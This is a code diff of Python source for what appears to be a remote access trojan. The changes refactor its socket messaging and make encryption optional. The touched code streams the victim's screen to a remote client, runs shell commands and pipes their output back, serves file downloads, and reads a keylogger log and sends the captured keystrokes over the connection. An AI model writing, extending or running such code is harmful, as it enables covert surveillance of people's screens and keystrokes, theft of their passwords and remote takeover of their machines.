@@ -146,7 +146,6 @@ try:
             except (ConnectionAbortedError, ConnectionResetError, OSError) as e:
                 print(f"THREAD {threading.current_thread().name} [FUNC {func.__name__}]: Connection disconnected by server without message:")
                 print(e)
-                raise e
         return wrapper
 
     @try_connection
@@ -160,15 +159,15 @@ try:
             proc.stdin.flush()
 
     #@profile
-    def screenShareClient(conn, response_id):
+    def screenShareClient(conn : SmartSocket, response_id):
         with mss.mss() as sct:
             monitor = sct.monitors[0]
             # send response to client
             # user32 = ctypes.windll.user32
             # local_resolution = str((user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)))
             local_resolution = (monitor['width'], monitor['height'])
-            conn.send(NetProtocol.packNetMessage(
-                NetMessage(type=NetTypes.NetStatus, data=NetStatusTypes.NetOK, extra=str(local_resolution), id=response_id)))
+            conn.send_message(
+                NetMessage(type=NetTypes.NetStatus, data=NetStatusTypes.NetOK, extra=str(local_resolution), id=response_id))
 
             # The region to capture
             i = 0
@@ -190,8 +189,13 @@ try:
                 # # Send pixels
                 # buffer.seek(0)
                 # g = buffer.read()
-                conn.send(len(image).to_bytes(4, "big"))
-                conn.send(image)
+                # conn.send(len(image).to_bytes(4, "big"))
+                # conn.send(image)
+                try:
+                    conn.send_appended_stream(image)
+                except:
+                    print("ScreenShare connection closed")
+                    return
 
 
     # def screenShareClient(conn):
@@ -222,7 +226,9 @@ try:
     @try_connection
     def handleOpenConnection(server : SmartSocket):
         client, address = server.accept()
-        client.set_key(server.Fkey)
+        # if server has Fkey that means that encryption is enabled. otherwise encryption is disabled and therefore we don't se an encryption key.
+        if server.Fkey:
+            client.set_key(server.Fkey)
         print("OpenConnection from: " + str(address))
 
         # listener loop
@@ -265,7 +271,7 @@ try:
                     client.send_message(NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetOK.value), id=id))
                     while p.poll() is None:
                         n = p.stdout.readline()
-                        client.send(n)
+                        client.send_appended_stream(n)
 
                 # if the request is to download file
                 elif message['data'] == NetTypes.NetDownloadFile.value:
@@ -485,6 +491,7 @@ try:
                     try:
                         with open(KEYLOG_PATH, "r") as f:
                             logger.debug("OPENED KEYLOGGER")
+                            # TODO - split the file into 16KB chunks and send it in 16KB chunks
                             s.send_message(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id))
                     except Exception as e:
                         logger.info(str(e))
@@ -612,7 +619,11 @@ try:
                 # if request to open a new connection
                 elif message['data'] == NetTypes.NetOpenConnection.value:
                     # create a server with the port specified in extra, and pass it to handleOpenConnection
-                    server = createServer(eKey=s.Fkey)
+                    if message['extra'] == True:
+                        Fkey = s.Fkey
+                    else:
+                        Fkey = None
+                    server = createServer(eKey=Fkey)
                     thread = threading.Thread(target=handleOpenConnection, args=(server,))
                     thread.start()
                     s.send_message(
